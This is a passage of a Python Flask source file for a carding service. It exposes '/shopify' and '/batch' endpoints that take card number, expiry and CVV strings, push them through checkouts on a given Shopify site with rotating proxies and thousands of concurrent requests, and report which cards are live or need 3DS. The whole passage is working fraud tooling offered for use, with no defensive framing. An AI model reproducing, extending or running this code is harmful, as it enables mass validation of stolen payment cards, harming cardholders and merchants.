        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}


# ------------------------ Concurrency Engine ------------------------

PER_USER_CONCURRENT = 1000
GLOBAL_MAX_CONCURRENT = 5000
MAX_CONCURRENT = PER_USER_CONCURRENT

_loop = None
_loop_thread = None
_global_semaphore = None
_user_semaphores = {}
_user_lock = threading.Lock()


def _start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()


def _init_loop_primitives():
    """Must be called ON the loop thread so the semaphore binds to that loop."""
    global _global_semaphore
    if _global_semaphore is None:
        _global_semaphore = asyncio.Semaphore(GLOBAL_MAX_CONCURRENT)


def get_event_loop():
    global _loop, _loop_thread
    if _loop is None or _loop.is_closed():
        _loop = asyncio.new_event_loop()
        _loop_thread = threading.Thread(target=_start_background_loop, args=(_loop,), daemon=True)
        _loop_thread.start()
        fut = asyncio.run_coroutine_threadsafe(_init_loop_primitives_async(), _loop)
        try:
            fut.result(timeout=5)
        except Exception:
            _loop.call_soon_threadsafe(_init_loop_primitives)
    return _loop


async def _init_loop_primitives_async():
    _init_loop_primitives()


async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str, user_key="default"):
    global _user_semaphores

    if user_key not in _user_semaphores:
        _user_semaphores[user_key] = asyncio.Semaphore(PER_USER_CONCURRENT)
    user_sem = _user_semaphores[user_key]

    async with user_sem:
        async with _global_semaphore:
            pace_start = time.time()
            await _admit_checkout()
            success, msg, gw, price, cur, proxy_status = await process_card(
                cc, mes, ano, cvv, site_url, variant_id, proxy_str)

            _3ds_indicators = ['OTP', 'THREE_D_SECURE', 'SCA_REQUIRED', 'AUTHENTICATION_REQUIRED', '3DS_REQUIRED']
            if msg:
                msg_upper = msg.upper()
                for indicator in _3ds_indicators:
                    if indicator in msg_upper:
                        msg = '3DS_REQUIRED'
                        success = False
                        break

            await _pace_response(pace_start, proxy_status)
            return success, msg, gw, price, cur, proxy_status


def _build_result(cc_string, success, message, gateway, price, currency, elapsed=None, proxy_status="Not Used"):
    clean_response = extract_clean_response(message)

    _3ds_codes = ['OTP_REQUIRED', 'THREE_D_SECURE_REQUIRED', 'AUTHENTICATION_REQUIRED',
                  'THREE_DS_REDIRECT', 'PAYMENTS_THREE_D_SECURE_REQUIRED', 'SCA_REQUIRED',
                  '3DS_REQUIRED']
    if clean_response.upper() in _3ds_codes or 'three_d_secure' in clean_response.lower() or 'otp' in clean_response.lower():
        clean_response = '3DS_REQUIRED'

    try:
        price_float = round(float(price), 2) if price is not None and str(price).strip() != '' else 0.0
    except (ValueError, TypeError):
        price_float = 0.0

    proxy_out = proxy_status if proxy_status in ("Live", "Dead", "Not Used") else ("Live" if proxy_status else "Not Used")
    result = {
        "cc": cc_string,
        "Gateway": gateway or "UNKNOWN",
        "Response": clean_response,
        "Price": price_float,
        "Currency": currency or "USD",
        "Status": bool(success),
        "Proxy": proxy_out,
        "Time": f"{float(elapsed):.2f}s" if elapsed is not None else "0.00s",
    }
    return result


# ------------------------ Flask App ---------------------------------
app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
try:
    app.json.sort_keys = False
except Exception:
    pass

import logging as _logging
_logging.getLogger('werkzeug').setLevel(_logging.ERROR)


@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        start_time = time.time()
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        user_key = request.args.get('key', 'default')

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get('variant')
        loop = get_event_loop()

        future = asyncio.run_coroutine_threadsafe(
            _throttled_process(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
                               site, variant_id, proxy_str, user_key=user_key), loop)
        success, message, gateway, price, currency, proxy_status = future.result(timeout=60)
        elapsed = time.time() - start_time

        result = _build_result(
            cc_string, success, message, gateway, price, currency,
            elapsed=elapsed, proxy_status=proxy_status)
        print(f"{result['cc']}  {result['Response']}  ${result['Price']} {result['Currency']}  {result['Time']}")
        return jsonify(result)

    except Exception as e:
        proxy_arg = request.args.get('proxy')
        return jsonify({
            "cc": request.args.get('cc', ''),
            "Gateway": "UNKNOWN",
            "Response": f"ERROR: {str(e)}",
            "Price": 0.0,
            "Currency": "USD",
            "Status": False,
            "Proxy": "Dead" if proxy_arg else "Not Used",
            "Time": "0.00s",
        }), 500


@app.route('/batch', methods=['POST'])
def batch_checker():
    try:
        batch_start = time.time()
        data = request.get_json(force=True)
        site = data.get('site', '')
        cards = data.get('cards', [])
        variant_id = data.get('variant')
        user_key = request.args.get('key', 'default')

        proxy_list = data.get('proxies', [])
        single_proxy = data.get('proxy')
        if not proxy_list and single_proxy:
            proxy_list = [single_proxy]

        if not site:
            return jsonify({"error": "Missing 'site' field", "status": False}), 400
        if not cards or not isinstance(cards, list):
            return jsonify({"error": "Missing or invalid 'cards' array", "status": False}), 400
        if len(cards) > MAX_CONCURRENT:
            return jsonify({"error": f"Max {MAX_CONCURRENT} cards per batch", "status": False}), 400

        parsed = []
        for i, cc_string in enumerate(cards):
            proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
            try:
                parts = parse_cc_string(cc_string.strip())
                parsed.append((cc_string.strip(), parts, proxy_for_card))
            except ValueError:
                parsed.append((cc_string.strip(), None, proxy_for_card))

        loop = get_event_loop()

        async def _run_batch():
            tasks = []
            for cc_string, parts, px in parsed:
                if parts is None:
                    async def _bad(cs=cc_string, prx=px):
                        return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD", ("Dead" if prx else "Not Used")
                    tasks.append(_bad())
                else:
                    async def _check(cs=cc_string, p=parts, prx=px, uk=user_key):
                        try:
                            success, msg, gw, price, cur, pstat = await _throttled_process(
                                p['cc'], p['mes'], p['ano'], p['cvv'], site, variant_id, prx, user_key=uk)
                            return cs, success, msg, gw, price, cur, pstat
                        except Exception as ex:
                            return cs, False, str(ex), "UNKNOWN", "0.00", "USD", ("Dead" if prx else "Not Used")
                    tasks.append(_check())
            return await asyncio.gather(*tasks)

        future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
        results = future.result(timeout=180)

        output = []
        for cc_string, success, message, gateway, price, currency, proxy_status in results:
            output.append(_build_result(
                cc_string, success, message, gateway, price, currency, proxy_status=proxy_status))

        batch_elapsed = time.time() - batch_start
        return jsonify({"results": output, "total_time": f"{batch_elapsed:.2f}s", "total_cards": len(output)})

    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500


@app.route('/')
def health():
    return jsonify({"status": "ok"})


@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        "status": "online",
        "per_user_concurrent": PER_USER_CONCURRENT,
        "global_max_concurrent": GLOBAL_MAX_CONCURRENT,
        "active_users": len(_user_semaphores),
        "endpoints": {
            "single": "GET /shopify?site=...&cc=...&key=...&proxy=...",
            "batch": "POST /batch {site, cards[], key, proxy}",
            "status": "GET /status"
        }
    })


if __name__ == "__main__":
    get_event_loop()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)